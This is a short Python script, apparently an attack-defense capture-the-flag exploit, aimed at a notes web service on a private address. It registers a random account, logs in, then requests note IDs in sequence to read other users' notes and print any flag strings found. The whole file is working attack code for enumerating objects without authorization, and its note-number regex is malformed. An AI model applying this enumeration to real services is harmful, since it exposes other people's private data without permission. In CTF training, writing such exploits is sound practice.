import requests
from random import randint as ri
import re
import subprocess

headers = {"User-Agent": "Yandex/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"}
site = "http://172.25.4.2:8080"
log = ri(1, 10000)
passw = ri(1, 10000)
s = requests.Session()
s.post(site + "/registration", data={"login": log, "password": passw}, headers=headers)
s = requests.Session()
s.post(site + "/registration", data={"login": log, "password": passw}, headers=headers)
s.post(site + "/auth", data={"login": log, "password": passw}, headers=headers)

for el in range(1, 9999999):
     r = s.get(site + "/notes/" + str(el), headers=headers).text
     r = r.split("\n")
     # print(el)
     
     for i in range(len(r)):
         resp = ""
         # print(r[i])
         if re.findall("Note #[1-1000000000]", r[i]):
             resp = r[i + 2]
             # print(resp)
         if "The flag is" in resp and "=" in resp:
             flag = resp.split()[-1]
             print(flag)
             
